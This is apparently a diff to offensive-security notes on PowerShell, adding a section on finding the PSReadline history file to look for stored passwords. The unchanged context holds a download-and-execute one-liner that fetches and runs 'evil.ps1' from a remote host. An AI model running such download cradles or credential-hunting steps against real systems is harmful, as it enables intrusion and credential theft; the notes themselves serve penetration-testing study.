@@ -14,6 +14,14 @@ powershell - < ps1file
 iex (new-object net.webclient).downloadstring('http://192.168.0.1/evil.ps1')
 ```
 
+## History Files
+
+You may find that useful information is stored in the global password history file.
+
+```aspnet
+(Get-PSReadlineOption).HistorySavePath
+```
+
 ## Execution Policy
 
 The powershelll Execution Policy controls what scripts the local user can run.  We can query the execution policy of the current powershell context by running:
